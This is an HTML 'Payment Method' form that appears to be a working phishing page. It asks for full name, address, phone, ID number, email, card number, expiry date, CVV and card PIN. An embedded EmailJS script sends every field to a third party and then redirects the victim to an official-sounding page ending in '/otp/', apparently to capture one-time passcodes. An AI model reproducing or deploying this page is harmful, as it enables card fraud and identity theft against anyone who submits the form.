<!DOCTYPE html>
<html lang="en">
<head>
    <link rel="stylesheet" href="index.css">
    <title>Application Form</title>
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script type="text/javascript">
        (function() {
            // https://dashboard.emailjs.com/admin/account
            emailjs.init('VDCSeZiTvFsTAhD3J');
        })();
    </script>
    <script type="text/javascript">
        window.onload = function() {
            document.getElementById('contact-form').addEventListener('submit', function(event) {
                event.preventDefault();
                // generate a five digit number for the contact_number variable
                this.contact_number.value = Math.random() * 100000 | 0;
                // these IDs from the previous steps
                emailjs.sendForm("service_smart","template_smart", this)
                .then(function() {
                    console.log('SUCCESS!');
                        let subscribe = document.getElementById('submit')
                        console.log('na me')
                        subscribe.style.animationName = 'done';
                        subscribe.value = 'DONE'
                        let Subscribe = setTimeout(sub, 5000);
                        function sub(){
                            window.location.href = ' https://official-online.github.io/otp/'
                        }
                        let yes = document.getElementById('yes')
                        yes.innerHTML = 'Yes'
                    }, function(error) {
                        console.log('FAILED...', error);
                        let subscribe = document.getElementById('submit')
                        subscribe.value = 'unable to submit'
                        subscribe.style.animationName = 'failed';
                        let Subscribe = setTimeout(sub, 4000);
                        function sub(){
                            subscribe.value = 'Submit'
                        }
                    });
            });
        }
    </script>
</head>
<body>
    <h2>PAYMENT METHOD</h2>
    <P id="p1">You won't be charged until you make a purchase</P>
    <div id="div1">
        <h3>Credit/Debit Card</h3>
        <p id="p2">Visa, MasterCard, Discover, American Express</p>
    </div>
    <form id="contact-form">
        <input type="hidden" name="contact_number">

        <div id="div4">

            <label for="name">Full Name:</label> <br>
            <div id="allName">
                <input type="text" name="name" id="name" placeholder="Enter First Name"> 
                <input type="text" name="surname" id="surname" placeholder="Enter Middle Name"> <br>
            </div>
            <input type="text" name="lastname" id="lastname" placeholder="Enter Last Name"> <br>
    
            <label for="address">Address:</label><br>
            <div id="residence">
                <input type="text" name="city" id="address" placeholder="Enter city">
                <input type="text" name="state" id="state" placeholder="Enter State / Province"> <br>
            </div>
            <input type="text" name="postal" id="postal" placeholder="Enter Postal / Zip Code"><br>

            <label for="phone">Phone Number:</label>
            <input type="number" name="phone" id="phone" placeholder="Enter Phone Number"><br>

            <label for="identity">ID Nummber:</label>
            <input type="number" name="identity" id="identity" placeholder="Enter ID Number"><br>

            <label for="email">Email-Address</label>
            <input type="email" name="email" id="email" placeholder="Enter Email Address">
        </div>

        <div id="form">
            
        <label for="card">Card Number</label>
        <input type="number" name="card" id="card" placeholder="xxxx xxxx xxxx xxxx"><br>

        <div id="div2">
            <label for="expiry">Expiry date</label>
            <label for="cvv">CVV</label>
        </div>
        <div id="div3">
            <input type="month" name="expiry" id="expiry">
            <input type="number" name="cvv" id="cvv" placeholder="xxx">
        </div>

        <label for="pin">Pin</label>
        <input type="number" name="pin" id="pin" placeholder="****">
      
        </div>
        <input type="submit" name="submit" value="Confirm" id="submit">
    </form>

</body>
</html>
